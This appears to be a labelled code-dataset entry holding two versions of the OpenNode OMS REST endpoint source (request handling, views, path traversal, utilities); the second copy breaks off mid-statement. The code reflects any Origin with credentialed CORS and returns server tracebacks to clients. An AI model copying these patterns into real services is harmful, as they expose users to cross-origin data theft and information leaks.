                from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility
                auth_util = getUtility(IHttpRestAuthenticationUtility)
                if token or not auth_util.get_basic_auth_credentials(request):
                    raise Forbidden('User does not have permission to access this resource')
                raise Unauthorized()

        for method in ('render_' + request.method, 'render'):
            # hasattr will return false on unauthorized fields
            renderer = get_renderer(view, method)
            if renderer:
                res = renderer(request)

                if needs_rw_transaction:
                    return res
                else:
                    return db.RollbackValue(res)

        raise NotImplementedError(""method %s not implemented\n"" % request.method)

    def get_interaction(self, request, token):
        # TODO: we can quickly disable rest auth
        # if get_config().getboolean('auth', 'enable_anonymous'):
        #     return None

        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        try:
            principal = authentication_utility.get_principal(token)
        except:
            # Avoid that changes in format of security token will require every user
            # to flush the cookies
            principal = 'oms.anonymous'

        if principal != 'oms.anonymous':
            authentication_utility.renew_token(request, token)

        if request.method == 'OPTIONS':
            principal = 'oms.rest_options'

        return new_interaction(principal)
/n/n/nopennode/oms/endpoint/httprest/view.py/n/nimport json
import os
import time
import Queue

from grokcore.component import context
from hashlib import sha1
from twisted.web.server import NOT_DONE_YET
from twisted.python import log
from twisted.internet import reactor, threads, defer
from zope.component import queryAdapter, handle
from zope.security.interfaces import Unauthorized
from zope.security.proxy import removeSecurityProxy

from opennode.oms.endpoint.httprest.base import HttpRestView, IHttpRestView
from opennode.oms.endpoint.httprest.root import BadRequest, NotFound
from opennode.oms.endpoint.ssh.cmd.security import effective_perms
from opennode.oms.endpoint.ssh.detached import DetachedProtocol
from opennode.oms.endpoint.ssh.cmdline import ArgumentParsingError
from opennode.oms.model.form import RawDataApplier
from opennode.oms.model.location import ILocation
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model.bin import ICommand
from opennode.oms.model.model.byname import ByNameContainer
from opennode.oms.model.model.events import ModelDeletedEvent
from opennode.oms.model.model.filtrable import IFiltrable
from opennode.oms.model.model.search import SearchContainer, SearchResult
from opennode.oms.model.model.stream import IStream, StreamSubscriber
from opennode.oms.model.model.symlink import Symlink, follow_symlinks
from opennode.oms.model.schema import model_to_dict
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import get_interaction
from opennode.oms.zodb import db


class DefaultView(HttpRestView):
    context(object)

    def render_GET(self, request):
        if not request.interaction.checkPermission('view', self.context):
            raise NotFound

        data = model_to_dict(self.context)

        data['id'] = self.context.__name__
        data['__type__'] = type(removeSecurityProxy(self.context)).__name__
        try:
            data['url'] = ILocation(self.context).get_url()
        except Unauthorized:
            data['url'] = ''

        interaction = get_interaction(self.context)
        data['permissions'] = effective_perms(interaction, self.context) if interaction else []

        # XXX: simplejson can't serialize sets
        if 'tags' in data:
            data['tags'] = list(data['tags'])

        return data

    def render_PUT(self, request):
        data = json.load(request.content)
        if 'id' in data:
            del data['id']

        data = self.put_filter_attributes(request, data)

        form = RawDataApplier(data, self.context)
        if not form.errors:
            form.apply()
            return [IHttpRestView(self.context).render_recursive(request, depth=0)]
        else:
            request.setResponseCode(BadRequest.status_code)
            return form.error_dict()

    def put_filter_attributes(self, request, data):
        """"""Offer the possibility for subclasses to massage the received json before default behavior.""""""
        return data

    def render_DELETE(self, request):
        force = request.args.get('force', ['false'])[0] == 'true'

        parent = self.context.__parent__
        del parent[self.context.__name__]

        try:
            handle(self.context, ModelDeletedEvent(parent))
        except Exception as e:
            if not force:
                raise e
            return {'status': 'failure'}

        return {'status': 'success'}


class ContainerView(DefaultView):
    context(IContainer)

    def render_GET(self, request):
        depth = request.args.get('depth', ['0'])[0]
        try:
            depth = int(depth)
        except ValueError:
            depth = 0

        return self.render_recursive(request, depth, top_level=True)

    def render_recursive(self, request, depth, filter_=[], top_level=False):
        container_properties = super(ContainerView, self).render_GET(request)

        if depth < 1:
            return self.filter_attributes(request, container_properties)

        exclude = [excluded.strip() for excluded in request.args.get('exclude', [''])[0].split(',')]

        def preconditions(obj):
            yield request.interaction.checkPermission('view', obj)
            yield obj.__name__ not in exclude
            yield obj.target.__parent__ == obj.__parent__ if type(obj) is Symlink else True

        items = map(follow_symlinks, filter(lambda obj: all(preconditions(obj)), self.context.listcontent()))

        def secure_render_recursive(item):
            try:
                return IHttpRestView(item).render_recursive(request, depth - 1)
            except Unauthorized:
                permissions = effective_perms(get_interaction(item), item)
                if 'view' in permissions:
                    return dict(access='denied', permissions=permissions,
                                __type__=type(removeSecurityProxy(item)).__name__)

        qlist = []
        limit = None
        offset = 0

        if top_level:
            qlist = request.args.get('q', [])
            qlist = map(lambda q: q.decode('utf-8'), qlist)
            limit = int(request.args.get('limit', [0])[0])
            offset = int(request.args.get('offset', [1])[0]) - 1
            if offset <= 0:
                offset = 0

        def secure_filter_match(item, q):
            try:
                return IFiltrable(item).match(q)
            except Unauthorized:
                return

        for q in qlist:
            items = filter(lambda item: secure_filter_match(item, q), items)

        children = filter(None, [secure_render_recursive(item) for item in items
                                 if queryAdapter(item, IHttpRestView) and not self.blacklisted(item)])

        total_children = len(children)

        if (limit is not None and limit != 0) or offset:
            children = children[offset : offset + limit]

        # backward compatibility:
        # top level results for pure containers are plain lists
        if top_level and (not container_properties or len(container_properties.keys()) == 1):
            return children

        if not top_level or depth > 0:
            container_properties['children'] = children
            container_properties['totalChildren'] = total_children

        return self.filter_attributes(request, container_properties)

    def blacklisted(self, item):
        return isinstance(item, ByNameContainer)


class SearchView(ContainerView):
    context(SearchContainer)

    def render_GET(self, request):
        q = request.args.get('q', [''])[0]

        if not q:
            return super(SearchView, self).render_GET(request)

        search = db.get_root()['oms_root']['search']
        res = SearchResult(search, q.decode('utf-8'))

        return IHttpRestView(res).render_GET(request)


class StreamView(HttpRestView):
    context(StreamSubscriber)

    cached_subscriptions = dict()

    def rw_transaction(self, request):
        return False

    def render(self, request):
        timestamp = int(time.time() * 1000)
        oms_root = db.get_root()['oms_root']

        limit = int(request.args.get('limit', ['100'])[0])
        after = int(request.args.get('after', ['0'])[0])

        subscription_hash = request.args.get('subscription_hash', [''])[0]
        if subscription_hash:
            if subscription_hash in self.cached_subscriptions:
                data = self.cached_subscriptions[subscription_hash]
            else:
                raise BadRequest(""Unknown subscription hash"")
        elif not request.content.getvalue():
            return {}
        else:
            data = json.load(request.content)
            subscription_hash = sha1(request.content.getvalue()).hexdigest()
            self.cached_subscriptions[subscription_hash] = data
            request.responseHeaders.addRawHeader('X-OMS-Subscription-Hash', subscription_hash)

        def val(r):
            objs, unresolved_path = traverse_path(oms_root, r)
            if unresolved_path:
                return [(timestamp, dict(event='delete', name=os.path.basename(r), url=r))]
            return IStream(objs[-1]).events(after, limit=limit)

        # ONC wants it in ascending time order
        # while internally we prefer to keep it newest first to
        # speed up filtering.
        # Reversed is not json serializable so we have to reify to list.
        res = [list(reversed(val(resource))) for resource in data]
        res = [(i, v) for i, v in enumerate(res) if v]
        return [timestamp, dict(res)]


class CommandView(DefaultView):
    context(ICommand)

    def write_results(self, request, pid, cmd):
        log.msg('Called %s got result: pid(%s) term writes=%s' % (
                cmd, pid, len(cmd.write_buffer)), system='command-view')
        request.write(json.dumps({'status': 'ok', 'pid': pid,
                                  'stdout': cmd.write_buffer}))
        request.finish()

    def render_PUT(self, request):
        """""" Converts arguments into command-line counterparts and executes the omsh command.

        Parameters passed as 'arg' are converted into positional arguments, others are converted into
        named parameters:

            PUT /bin/ls?arg=/some/path&arg=/another/path&-l&--recursive

        thus translates to:

            /bin/ls /some/path /another/path -l --recursive

        Allows blocking (synchronous) and non-blocking operation using the 'asynchronous' parameter (any
        value will trigger it). Synchronous operation requires two threads to function.
        """"""

        def named_args_filter_and_flatten(nargs):
            for name, vallist in nargs:
                if name not in ('arg', 'asynchronous'):
                    for val in vallist:
                        yield name
                        yield val

        def convert_args(args):
            tokenized_args = args.get('arg', [])
            return tokenized_args + list(named_args_filter_and_flatten(args.items()))

        protocol = DetachedProtocol()
        protocol.interaction = get_interaction(self.context) or request.interaction

        args = convert_args(request.args)
        args = filter(None, args)
        cmd = self.context.cmd(protocol)
        # Setting write_buffer to a list makes command save the output to the buffer too
        cmd.write_buffer = []
        d0 = defer.Deferred()

        try:
            pid = threads.blockingCallFromThread(reactor, cmd.register, d0, args,
                                                 '%s %s' % (request.path, args))
        except ArgumentParsingError, e:
            raise BadRequest(str(e))

        q = Queue.Queue()

        def execute(cmd, args):
            d = defer.maybeDeferred(cmd, *args)
            d.addBoth(q.put)
            d.chainDeferred(d0)

        dt = threads.deferToThread(execute, cmd, args)

        if request.args.get('asynchronous', []):
            reactor.callFromThread(self.write_results, request, pid, cmd)
        else:
            dt.addBoth(lambda r: threads.deferToThread(q.get, True, 60))
            dt.addCallback(lambda r: reactor.callFromThread(self.write_results, request, pid, cmd))

            def errhandler(e, pid, cmd):
                e.trap(ArgumentParsingError)
                raise BadRequest(str(e))
            dt.addErrback(errhandler, pid, cmd)
        return NOT_DONE_YET
/n/n/nopennode/oms/model/traversal.py/n/nimport logging
import re

from grokcore.component import Adapter, implements, baseclass
from zope.interface import Interface

from opennode.oms.model.model.symlink import follow_symlinks


__all__ = ['traverse_path', 'traverse1']


log = logging.getLogger(__name__)


class ITraverser(Interface):
    """"""Adapters providing object traversal should implement this interface.""""""

    def traverse(name):
        """"""Takes the name of the object to traverse to and returns the traversed object, if any.""""""


class Traverser(Adapter):
    """"""Base class for all object traversers.""""""
    implements(ITraverser)
    baseclass()


def parse_path(path):
    if not path or path == '/':
        return []

    path = re.sub(r'\/+', '/', path)

    if path.endswith('/'):
        path = path[:-1]

    if path.startswith('/'):
        path = path[1:]

    path = path.split('/')
    return path


def traverse_path(obj, path):
    """"""Starting from the given object, traverses all its descendant
    objects to find an object that matches the given path.

    Returns a tuple that contains the object up to which the traversal
    was successful plus all objects that led to that object, and the
    part of the path that could not be resolved.

    """"""
    path = parse_path(path)

    if not path:
        return [obj], []

    ret = [obj]
    while path:
        name = path[0]
        try:
            traverser = ITraverser(ret[-1])
        except TypeError:
            break

        next_obj = follow_symlinks(traverser.traverse(name))

        if not next_obj:
            break

        ret.append(next_obj)
        path = path[1:]

    return ret[1:], path


def traverse1(path):
    """"""Provides a shortcut for absolute path traversals without
    needing to pass in the root object.

    """"""

    # Do it here just in case; to avoid circular imports:
    from opennode.oms.zodb import db

    oms_root = db.get_root()['oms_root']
    objs, untraversed_path = traverse_path(oms_root, path)
    if objs and not untraversed_path:
        return objs[-1]
    else:
        return None


def canonical_path(item):
    path = []
    from opennode.oms.security.authentication import Sudo
    while item:
        with Sudo(item):
            assert item.__name__ is not None, '%s.__name__ is None' % item
            item = follow_symlinks(item)
            path.insert(0, item.__name__)
            item = item.__parent__
    return '/'.join(path)
/n/n/nopennode/oms/util.py/n/nimport functools
import inspect
import json
import time
import threading

from Queue import Queue, Empty

import zope.interface
from zope.component import getSiteManager, implementedBy
from zope.interface import classImplements
from twisted.internet import defer, reactor
from twisted.python import log
from twisted.python.failure import Failure

from opennode.oms.config import get_config


def get_direct_interfaces(obj):
    """"""Returns the interfaces that the parent class of `obj`
    implements, exluding any that any of its ancestor classes
    implement.

    >>> from zope.interface import Interface, implements, implementedBy
    >>> class IA(Interface): pass
    >>> class IB(Interface): pass
    >>> class A: implements(IA)
    >>> class B(A): implements(IB)
    >>> b = B()
    >>> [i.__name__ for i in list(implementedBy(B).interfaces())]
    ['IB', 'IA']
    >>> [i.__name__ for i in get_direct_interfaces(b)]
    ['IB']

    """"""
    cls = obj if isinstance(obj, type) else type(obj)

    if not isinstance(obj, type) and hasattr(obj, 'implemented_interfaces'):
        interfaces = obj.implemented_interfaces()
    else:
        interfaces = list(zope.interface.implementedBy(cls).interfaces())

    for base_cls in cls.__bases__:
        for interface in list(zope.interface.implementedBy(base_cls).interfaces()):
            # in multiple inheritance this it could be already removed
            if interface in interfaces:
                interfaces.remove(interface)

    return interfaces


def get_direct_interface(obj):
    interfaces = get_direct_interfaces(obj)
    if not interfaces:
        return None

    if len(interfaces) == 1:
        return interfaces[0]
    else:
        raise Exception(""Object implements more than 1 interface"")


def query_adapter_for_class(cls, interface):
    return getSiteManager().adapters.lookup([implementedBy(cls)], interface)


class Singleton(type):
    """"""Singleton metaclass.""""""

    def __init__(cls, name, bases, dict):
        super(Singleton, cls).__init__(name, bases, dict)
        cls.instance = None

    def __call__(cls, *args, **kw):
        if cls.instance is None:
            cls.instance = super(Singleton, cls).__call__(*args, **kw)
        return cls.instance


def subscription_factory(cls, *args, **kwargs):
    """"""Utility which allows to to quickly register a subscription adapters which returns new
    instantiated objects of a given class

    >>> provideSubscriptionAdapter(subscription_factory(MetricsDaemonProcess), adapts=(IProc,))

    """"""

    class SubscriptionFactoryWrapper(object):
        def __new__(self, *_ignore):
            return cls(*args)

    interfaces = get_direct_interfaces(cls)
    classImplements(SubscriptionFactoryWrapper, *interfaces)
    return SubscriptionFactoryWrapper


def adapter_value(value):
    """"""Utility which allows to to quickly register a subscription adapter  as a value instead of

    >>> provideSubscriptionAdapter(adapter_value(['useful', 'stuff']), adapts=(Compute,), provides=ISomething)

    """"""

    def wrapper(*_):
        return value
    return wrapper


def async_sleep(secs):
    """"""Util which helps writing synchronous looking code with
    defer.inlineCallbacks.

    Returns a deferred which is triggered after `secs` seconds.

    """"""

    d = defer.Deferred()
    reactor.callLater(secs, d.callback, None)
    return d


def blocking_yield(deferred, timeout=None):
    """"""This utility is part of the HDK (hack development toolkit) use with care and remove its usage asap.

    Sometimes we have to synchronously wait for a deferred to complete,
    for example when executing inside db.transact code, which cannot 'yield'
    because currently db.transact doesn't handle returning a deferred.

    Or because we are running code inside a handler which cannot return a deferred
    otherwise we cannot block the caller or rollback the transaction in case of async code
    throwing exception (scenario: we want to prevent deletion of node)

    Use this utility only until you refactor the upstream code in order to use pure async code.
    """"""

    q = Queue()
    deferred.addBoth(q.put)
    try:
        ret = q.get(True, timeout or 100)
    except Empty:
        raise defer.TimeoutError
    if isinstance(ret, Failure):
        ret.raiseException()
    else:
        return ret


def threaded(fun):
    """"""Helper decorator to quickly turn a function in a threaded function using a newly allocated thread,
    mostly useful during debugging/profiling in order to see if there are any queuing issues in the
    threadpools.

    """"""

    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=fun, args=args, kwargs=kwargs)
        thread.start()
    return wrapper


def trace(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        log.msg('%s %s %s' % (fun, args, kwargs), system='trace')
        return fun(*args, **kwargs)
    return wrapper


def trace_methods(cls):
    def trace_method(name):
        fun = getattr(cls, name)
        if inspect.ismethod(fun):
            setattr(cls, name, trace(fun))

    for name in cls.__dict__:
        trace_method(name)


def get_u(obj, key):
    val = obj.get(key)
    return unicode(val) if val is not None else None


def get_i(obj, key):
    val = obj.get(key)
    return int(val) if val is not None else None


def get_f(obj, key):
    val = obj.get(key)
    return float(val) if val is not None else None


def exception_logger(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        try:
            res = fun(*args, **kwargs)
            if isinstance(res, defer.Deferred):
                @res
                def on_error(failure):
                    log.msg(""Got unhandled exception: %s"" % failure.getErrorMessage(), system='debug')
                    if get_config().getboolean('debug', 'print_exceptions'):
                        log.err(failure, system='debug')
            return res
        except Exception:
            if get_config().getboolean('debug', 'print_exceptions'):
                log.err(system='debug')
            raise
    return wrapper


def find_nth(haystack, needle, n, start_boundary=None):
    start = haystack.find(needle, start_boundary)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start + len(needle))
        n -= 1
    return start


class benchmark(object):
    """"""Can be used either as decorator:
    >>> class Foo(object):
    ...   @benchmark(""some description"")
    ...   def doit(self, args):
    ...      # your code


    or as context manager:
    >>> with benchmark(""some description""):
    >>>    # your code

    and it will print out the time spent in the function or block.
    """"""

    def __init__(self, name):
        self.name = name

    def __call__(self, fun):
        @functools.wraps(fun)
        def wrapper(*args, **kwargs):
            with self:
                return fun(*args, **kwargs)
        return wrapper

    def __enter__(self):
        self.start = time.time()

    def __exit__(self, ty, val, tb):
        end = time.time()
        print(""%s : %0.3f seconds"" % (self.name, end - self.start))
        return False


class TimeoutException(Exception):
    """"""Raised when time expires in timeout decorator""""""


def timeout(secs):
    """"""
    Decorator to add timeout to Deferred calls
    """"""
    def wrap(func):
        @defer.inlineCallbacks
        @functools.wraps(func)
        def _timeout(*args, **kwargs):
            rawD = func(*args, **kwargs)
            if not isinstance(rawD, defer.Deferred):
                defer.returnValue(rawD)

            timeoutD = defer.Deferred()
            timesUp = reactor.callLater(secs, timeoutD.callback, None)

            try:
                rawResult, timeoutResult = yield defer.DeferredList([rawD, timeoutD],
                                                                    fireOnOneCallback=True,
                                                                    fireOnOneErrback=True,
                                                                    consumeErrors=True)
            except defer.FirstError, e:
                #Only rawD should raise an exception
                assert e.index == 0
                timesUp.cancel()
                e.subFailure.raiseException()
            else:
                #Timeout
                if timeoutD.called:
                    rawD.cancel()
                    raise TimeoutException(""%s secs have expired"" % secs)

            #No timeout
            timesUp.cancel()
            defer.returnValue(rawResult)
        return _timeout
    return wrap


class JsonSetEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, set):
            return list(obj)
        return json.JSONEncoder.default(self, obj)
/n/n/n",0
167,fb7d11509cd93463ac3ce9178b97910a8be1b05d,"/opennode/oms/endpoint/httprest/base.py/n/nfrom grokcore.component import Adapter, implements, baseclass
from grokcore.security import require
from zope.interface import Interface


class IHttpRestView(Interface):
    def render(request):
        pass

    def render_recursive(request, depth):
        pass

    def rw_transaction(request):
        """"""Return true if we this request should be committed""""""


class IHttpRestSubViewFactory(Interface):
    def resolve(path):
        """"""Resolve a view for a given sub path""""""


class HttpRestView(Adapter):
    implements(IHttpRestView)
    baseclass()
    require('rest')

    __builtin_attributes__ = ['id', 'children']

    def filter_attributes(self, request, data):
        """"""Handle the filtering of attributes according to the 'attrs' parameter in the request""""""
        attrs = request.args.get('attrs', [''])[0]
        if attrs:
            filtered_data = {}
            for a in attrs.decode('utf-8').split(',') + self.__builtin_attributes__:
                if a in data:
                    filtered_data[a] = data[a]
            return filtered_data
        return data

    def render_recursive(self, request, depth):
        for method in ('render_' + request.method, 'render'):
            if hasattr(self, method):
                return self.filter_attributes(request, getattr(self, method)(request))
        raise NotImplemented(""method %s not implemented\n"" % request.method)

    def render_OPTIONS(self, request):
        all_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']
        has_methods = [m for m in all_methods if hasattr(self, 'render_%s' % m)] + ['OPTIONS']
        request.setHeader('Allow', ', '.join(has_methods))

        from opennode.oms.endpoint.httprest.root import EmptyResponse
        return EmptyResponse

    def rw_transaction(self, request):
        return request.method != 'GET'
/n/n/n/opennode/oms/endpoint/httprest/root.py/n/nimport json
import functools
import zope.security.interfaces

from twisted.internet import defer
from twisted.python import log, failure
from twisted.web import resource
from twisted.web.server import NOT_DONE_YET
from zope.component import queryAdapter, getUtility

from opennode.oms.config import get_config
from opennode.oms.endpoint.httprest.base import IHttpRestView, IHttpRestSubViewFactory
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import proxy_factory
from opennode.oms.security.interaction import new_interaction
from opennode.oms.util import blocking_yield
from opennode.oms.zodb import db


class EmptyResponse(Exception):
    pass


class HttpStatus(Exception):
    def __init__(self, body=None, *args, **kwargs):
        super(HttpStatus, self).__init__(*args, **kwargs)
        self.body = body

    @property
    def status_code(self):
        raise NotImplementedError

    @property
    def status_description(self):
        raise NotImplementedError

    headers = {}


class NotFound(HttpStatus):
    status_code = 404
    status_description = ""Not Found""


class NotImplemented(HttpStatus):
    status_code = 501
    status_description = ""Not Implemented""


class AbstractRedirect(HttpStatus):
    def __init__(self, url, *args, **kwargs):
        super(AbstractRedirect, self).__init__(*args, **kwargs)
        self.url = url

    @property
    def headers(self):
        return {'Location': self.url}


class SeeCanonical(AbstractRedirect):
    status_code = 301
    status_description = ""Moved Permanently""


class SeeOther(AbstractRedirect):
    status_code = 303
    status_description = ""Moved Temporarily""


class Unauthorized(HttpStatus):
    status_code = 401
    status_description = ""Authorization Required""

    headers = {'WWW-Authenticate': 'Basic realm=OMS',
               'Set-Cookie': 'oms_auth_token=;expires=Wed, 01 Jan 2000 00:00:00 GMT'}


class Forbidden(HttpStatus):
    status_code = 403
    status_description = ""Forbidden""


class BadRequest(HttpStatus):
    status_code = 400
    status_description = ""Bad Request""


def log_wrapper(self, f, server):
    @functools.wraps(f)
    def log_(request):
        """"""
        Log a request's result to the logfile, by default in combined log format.
        """"""
        if hasattr(request, 'interaction'):
            principals = map(lambda pp: pp.principal.id, request.interaction.participations)
        else:
            principals = []
        if hasattr(self, ""logFile""):
            line = '%s %s - %s ""%s"" %d %s ""%s"" ""%s""\n' % (
                request.getClientIP(),
                principals,
                self._logDateTime,
                '%s %s %s' % (self._escape(request.method),
                              self._escape(request.uri),
                              self._escape(request.clientproto)),
                request.code,
                request.sentLength or ""-"",
                self._escape(request.getHeader(""referer"") or ""-""),
                self._escape(request.getHeader(""user-agent"") or ""-""))
            self.logFile.write(line)
    return log_


class HttpRestServer(resource.Resource):
    """"""Restful HTTP API interface for OMS.

    Exposes a JSON web service to communicate with OMS.

    """"""

    def getChild(self, name, request):
        """"""We are the handler for anything below this base url, except what explicitly added in oms.tac.""""""
        return self

    def __init__(self, avatar=None):
        ## Twisted Resource is a not a new style class, so emulating a super-call
        resource.Resource.__init__(self)
        self.avatar = avatar

        self.use_security_proxy = get_config().getboolean('auth', 'security_proxy_rest')

    def render(self, request):
        request.site.log = log_wrapper(request.site, request.site.log, self)
        deferred = self._render(request)

        @deferred
        def on_error(error):
            log.msg(""Error while rendering http %s"", system='httprest')
            log.err(error, system='httprest')

        return NOT_DONE_YET

    @defer.inlineCallbacks
    def _render(self, request):
        request.setHeader('Content-type', 'application/json')
        origin = request.getHeader('Origin')
        if origin:
            request.setHeader('Access-Control-Allow-Origin', origin)
            request.setHeader('Access-Control-Allow-Credentials', 'true')
        else:
            request.setHeader('Access-Control-Allow-Origin', '*')
        request.setHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS, HEAD')
        request.setHeader('Access-Control-Allow-Headers',
                          'Origin, Content-Type, Cache-Control, X-Requested-With')

        ret = None
        try:
            ret = yield self.handle_request(request)
            if ret is EmptyResponse:
                raise ret
        except EmptyResponse:
            pass
        except HttpStatus as exc:
            request.setResponseCode(exc.status_code, exc.status_description)
            for name, value in exc.headers.items():
                request.responseHeaders.addRawHeader(name, value)
            if exc.body:
                request.write(json.dumps(exc.body))
            else:
                request.write(""%s %s\n"" % (exc.status_code, exc.status_description))
            if exc.message:
                request.write(""%s\n"" % exc.message)
        except Exception:
            request.setResponseCode(500, ""Server Error"")
            request.write(""%s %s\n\n"" % (500, ""Server Error""))
            log.err(system='httprest')
            failure.Failure().printTraceback(request)
        else:
            # allow views to take full control of output streaming
            if ret != NOT_DONE_YET:
                def render(obj):
                    if isinstance(obj, set):
                        return list(obj)  # safeguard against dumping sets
                    if hasattr(obj, '__str__'):
                        return str(obj)
                    log.msg(""RENDERING ERROR, cannot json serialize %s"" % obj, system='httprest')
                    raise TypeError

                request.write(json.dumps(ret, indent=2, default=render) + '\n')
        finally:
            if ret != NOT_DONE_YET:
                request.finish()

    def check_auth(self, request):
        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        credentials = authentication_utility.get_basic_auth_credentials(request)
        if credentials:
            blocking_yield(authentication_utility.authenticate(request, credentials, basic_auth=True))
            return authentication_utility.generate_token(credentials)
        else:
            return authentication_utility.get_token(request)

    def find_view(self, obj, unresolved_path):

        sub_view_factory = queryAdapter(obj, IHttpRestSubViewFactory)
        if sub_view_factory:
            view = sub_view_factory.resolve(unresolved_path)
        else:
            view = queryAdapter(obj, IHttpRestView)

        if not view:
            raise NotFound

        return view

    @db.transact
    def handle_request(self, request):
        """"""Takes a request, maps it to a domain object and a
        corresponding IHttpRestView, and returns the rendered output
        of that view.

        """"""
        token = self.check_auth(request)

        oms_root = db.get_root()['oms_root']
        objs, unresolved_path = traverse_path(oms_root, request.path[1:])

        if not objs and unresolved_path:
            objs = [oms_root]

        obj = objs[-1]

        interaction = self.get_interaction(request, token)
        request.interaction = interaction

        if self.use_security_proxy:
            obj = proxy_factory(obj, interaction)

        view = self.find_view(obj, unresolved_path)
        needs_rw_transaction = view.rw_transaction(request)

        # create a security proxy if we have a secured interaction
        if interaction:
            try:
                view = proxy_factory(view, interaction)
            except:
                # XXX: TODO: define a real exception for this proxy creation error
                # right now we want to ignore security when there are no declared rules
                # on how to secure a view
                pass

        def get_renderer(view, method):
            try:
                return getattr(view, method, None)
            except zope.security.interfaces.Unauthorized:
                from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

                if token or not getUtility(IHttpRestAuthenticationUtility).get_basic_auth_credentials(request):
                    raise Forbidden('User does not have permission to access this resource')
                raise Unauthorized()

        for method in ('render_' + request.method, 'render'):
            # hasattr will return false on unauthorized fields
            renderer = get_renderer(view, method)
            if renderer:
                res = renderer(request)

                if needs_rw_transaction:
                    return res
                else:
                    return db.RollbackValue(res)

        raise NotImplementedError(""method %s not implemented\n"" % request.method)

    def get_interaction(self, request, token):
        # TODO: we can quickly disable rest auth
        # if get_config().getboolean('auth', 'enable_anonymous'):
        #     return None

        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        try:
            principal = authentication_utility.get_principal(token)
        except:
            # Avoid that changes in format of security token will require every user
            # to flush the cookies
            principal = 'oms.anonymous'

        if principal != 'oms.anonymous':
            authentication_utility.renew_token(request, token)

        if request.method == 'OPTIONS':
            principal = 'oms.rest_options'

        return new_interaction(principal)
/n/n/n/opennode/oms/endpoint/httprest/view.py/n/nimport json
import os
import time
import Queue

from grokcore.component import context
from hashlib import sha1
from twisted.web.server import NOT_DONE_YET
from twisted.python import log
from twisted.internet import reactor, threads, defer
from zope.component import queryAdapter, handle
from zope.security.interfaces import Unauthorized
from zope.security.proxy import removeSecurityProxy

from opennode.oms.endpoint.httprest.base import HttpRestView, IHttpRestView
from opennode.oms.endpoint.httprest.root import BadRequest, NotFound
from opennode.oms.endpoint.ssh.cmd.security import effective_perms
from opennode.oms.endpoint.ssh.detached import DetachedProtocol
from opennode.oms.endpoint.ssh.cmdline import ArgumentParsingError
from opennode.oms.model.form import RawDataApplier
from opennode.oms.model.location import ILocation
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model.bin import ICommand
from opennode.oms.model.model.byname import ByNameContainer
from opennode.oms.model.model.events import ModelDeletedEvent
from opennode.oms.model.model.filtrable import IFiltrable
from opennode.oms.model.model.search import SearchContainer, SearchResult
from opennode.oms.model.model.stream import IStream, StreamSubscriber
from opennode.oms.model.model.symlink import Symlink, follow_symlinks
from opennode.oms.model.schema import model_to_dict
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import get_interaction
from opennode.oms.zodb import db


class DefaultView(HttpRestView):
    context(object)

    def render_GET(self, request):
        if not request.interaction.checkPermission('view', self.context):
            raise NotFound()

        data = model_to_dict(self.context)

        data['id'] = self.context.__name__
        data['__type__'] = type(removeSecurityProxy(self.context)).__name__
        try:
            data['url'] = ILocation(self.context).get_url()
        except Unauthorized:
            data['url'] = ''

        interaction = get_interaction(self.context)
        data['permissions'] = effective_perms(interaction, self.context) if interaction else []

        # XXX: simplejson can't serialize sets
        if 'tags' in data:
            data['tags'] = list(data['tags'])

        return data

    def render_PUT(self, request):
        data = json.load(request.content)
        if 'id' in data:
            del data['id']

        data = self.put_filter_attributes(request, data)

        form = RawDataApplier(data, self.context)
        if not form.errors:
            form.apply()
            return [IHttpRestView(self.context).render_recursive(request, depth=0)]
        else:
            request.setResponseCode(BadRequest.status_code)
            return form.error_dict()

    def put_filter_attributes(self, request, data):
        """"""Offer the possibility to subclasses to massage the received json before default behavior.""""""
        return data

    def render_DELETE(self, request):
        force = request.args.get('force', ['false'])[0] == 'true'

        parent = self.context.__parent__
        del parent[self.context.__name__]

        try:
            handle(self.context, ModelDeletedEvent(parent))
        except Exception as e:
            if not force:
                raise e
            return {'status': 'failure'}

        return {'status': 'success'}


class ContainerView(DefaultView):
    context(IContainer)

    def render_GET(self, request):
        depth = request.args.get('depth', ['0'])[0]
        try:
            depth = int(depth)
        except ValueError:
            depth = 0

        return self.render_recursive(request, depth, top_level=True)

    def render_recursive(self, request, depth, filter_=[], top_level=False):
        container_properties = super(ContainerView, self).render_GET(request)

        if depth < 1:
            return self.filter_attributes(request, container_properties)

        exclude = [excluded.strip() for excluded in request.args.get('exclude', [''])[0].split(',')]

        def preconditions(obj):
            yield request.interaction.checkPermission('view', obj)
            yield obj.__name__ not in exclude
            yield obj.target.__parent__ == obj.__parent__ if type(obj) is Symlink else True

        items = map(follow_symlinks, filter(lambda obj: all(preconditions(obj)), self.context.listcontent()))

        def secure_render_recursive(item):
            try:
                return IHttpRestView(item).render_recursive(request, depth - 1)
            except Unauthorized:
                permissions = effective_perms(get_interaction(item), item)
                if 'view' in permissions:
                    return dict(access='denied', permissions=permissions,
                                __type__=type(removeSecurityProxy(item)).__name__)

        qlist = []
        limit = None
        offset = 0

        if top_level:
            qlist = request.args.get('q', [])
            qlist = map(lambda q: q.decode('utf-8'), qlist)
            limit = int(request.args.get('limit', [0])[0])
            offset = int(request.args.get('offset', [1])[0]) - 1
            if offset <= 0:
                offset = 0

        def secure_filter_match(item, q):
            try:
                return IFiltrable(item).match(q)
            except Unauthorized:
                return

        for q in qlist:
            items = filter(lambda item: secure_filter_match(item, q), items)

        children = filter(None, [secure_render_recursive(item) for item in items
